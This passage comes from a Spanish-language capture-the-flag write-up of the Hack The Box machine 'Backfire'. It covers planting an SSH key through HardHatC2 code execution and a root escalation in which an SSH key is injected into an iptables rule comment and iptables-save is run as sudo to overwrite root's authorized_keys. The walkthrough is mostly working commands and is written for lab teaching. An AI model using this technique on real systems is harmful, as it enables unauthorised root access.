echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4VTWaxpy5Wx6rXfjyhboP5DeQdjM5ZSwYLZLHZMsf6xIukBMp2LlXOIIB4sq4nIK9CgzQA384ddlxCyvMXU3YnuxvhIWMna+xlOpVQdRF5pfrviWcAApm6n5io8pTNum0Jj1RjeQ7br2zN/gsQEK1UTzVD/fYc6yUybyqJWzsl7gxzFo/QARia+YzxyEHcz8qOqpoFHdWaNypyE68nNoJ+yO3LLxoLVJJXxxjKXR/f8bE5jv4vJwHkqclXynDTfFsbeprnC0dGzzf1waE16dpp6EiOocJ3E0/w8pJM1nxj63LJGLOjo4qiWqnxdFjzbKgiYeo3Gf71wEKLf/zg8fp84n9kvn++UXGBEcUuJJSO+2KmrSNz03A2pLsdsxsUYEtwX51RmPbPb1EwAF4rk8idz0hVwe5lQZiZ2oRILCx2r5i0eABVrA8fUCSKGTsBhwQ4TINUwO2EztpzmAPzGb4/9pYrc5TrdXwiSjH9qBEbzk5cfquu7ZGObiA86jbRZc= root@parrot' >> ~/.ssh/authorized_keys
~~~

Para saber si el comando se ejecutó en el servidor podemos ver un ícono de `check` a izquierda

![image-center](/assets/images/posts/backfire-hardhatc2-rce.png)
{: .align-center}


## Shell as `sergej`

Con el comando correctamente ejecutado, en teoría ahora tendríamos la capacidad de conectarnos por `ssh`, al igual que con el usuario `ilya`

~~~ bash
ssh sergej@backfire.htb 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
sergej@backfire:~$ 
~~~

Haremos posible limpiar la pantalla con `Ctrl + L` para poder operar de forma más cómoda

~~~ bash
sergej@backfire:~$ export TERM=xterm
~~~


## Abusing `iptables` - Sudoers

Listaremos los privilegios configurados a nivel de `sudo` que pueda ejecutar este usuario, veremos que puede ejecutar `iptables` e `iptables-save` como `root`

~~~ bash
sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
~~~

Podemos consultar las reglas de firewall en formato comando con el parámetro `-S`

~~~ bash
sergej@backfire:/tmp$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
~~~

Crearemos una nueva regla que permita tráfico en la interfaz `loopback`, esto solo servirá como excusa para agregar un comentario. 

En el siguiente ejemplo agregaremos un comentario a modo de prueba de concepto

~~~ bash
sergej@backfire:/tmp$ sudo iptables -A INPUT -i lo -m comment --comment "Allow packets to localhost This rule rocks!" -j ACCEPT
~~~

Ahora guardaremos las reglas generando un archivo con el comando `iptables-save`

~~~ bash
sergej@backfire:/tmp$ sudo iptables-save -f test.txt
sergej@backfire:/tmp$ ls -l test.txt
-rw-r--r-- 1 root root 618 Jun  7 01:03 test.txt
~~~

Si vemos el contenido del archivo `test.txt` veremos la regla que generamos

~~~ bash
sergej@backfire:/tmp$ cat test.txt
# Generated by iptables-save v1.8.9 (nf_tables) on Sat Jun  7 10:48:53 2025
*filter
:INPUT ACCEPT [135:10174]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [124:14300]
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "Allow packets to localhost This rule rocks!" -j ACCEPT
COMMIT
# Completed on Sat Jun  7 10:48:53 2025
~~~

### Generating SSH `ed25519` Key

Generaremos un nuevo par de claves con el algoritmo `ed25519`, ya que si utilizamos la clave que generamos antes con `rsa`, superaremos el límite de caracteres

~~~ bash
ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:J8jH+r0EF/zy94Qv0vYzPPWxGh2B3/JrPLSarWP34L4 root@parrot
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|         .    .  |
|          o  . . |
|     . o   o  . o|
|      o S + . .o.|
|       o = o  .*o|
|      .   . .oB.O|
|       . o  .=B^o|
|        . o..OE*@|
+----[SHA256]-----+
~~~

Copiaremos la clave pública con con la ayuda de `xclip`

~~~ bash
cat ~/.ssh/id_ed25519.pub | xclip -sel clip
~~~

En la máquina víctima, agregaremos una regla que inyecte nuestra clave pública SSH dentro del comentario de la regla

~~~ bash
sergej@backfire:/tmp$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjIlDesAq5x5NcsEMfUI3hn5zFyZ78CYp32GlxNFrlK root@parrot\n'
~~~

Luego de crearla, podemos comprobar que se haya añadido correctamente con el comando `sudo iptables -S`.

Ahora guardaremos la nueva regla en el archivo `authorized_keys`, gracias al formato que utilizamos en el comentario `$'\nSSH-key\n'` esta se interpretará como un archivo `authorized_keys`, y lograremos conectarnos por `ssh` sin proporcionar contraseña

~~~ bash
sergej@backfire:/tmp$ sudo iptables-save -f /root/.ssh/authorized_keys
~~~


## Root Time

Ahora nos conectaremos como el usuario `root` utilizando la clave pública que acabamos de generar

~~~ bash
ssh -i ~/.ssh/id_ed25519 root@backfire.htb 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
root@backfire:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Ya podremos ver la flag del sistema contenida dentro del archivo `root.txt`

~~~ bash
root@backfire:~# cat root.txt
d31...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Successful people ask better questions, and as a result, they get better answers.
> — Tony Robbins
{: .notice--info}
